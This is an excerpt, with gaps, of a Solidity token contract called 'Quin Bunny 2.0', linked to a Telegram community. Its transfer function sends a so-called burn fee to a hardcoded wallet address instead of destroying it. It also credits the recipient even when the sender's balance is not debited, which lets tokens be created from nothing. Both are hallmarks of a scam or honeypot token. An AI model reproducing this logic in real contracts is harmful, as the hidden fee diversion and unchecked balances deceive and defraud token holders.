...
// Submitted for Telegram: https://t.me/quinbunny_community
...
contract  QuinBunnyTwoPointZero  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Quin Bunny 2.0";
    string private _symbol = "QBY2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xf158055475823e5E644e49ebf1388c3bcE38f17f] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xf158055475823e5E644e49ebf1388c3bcE38f17f, _bruntoken);
        }
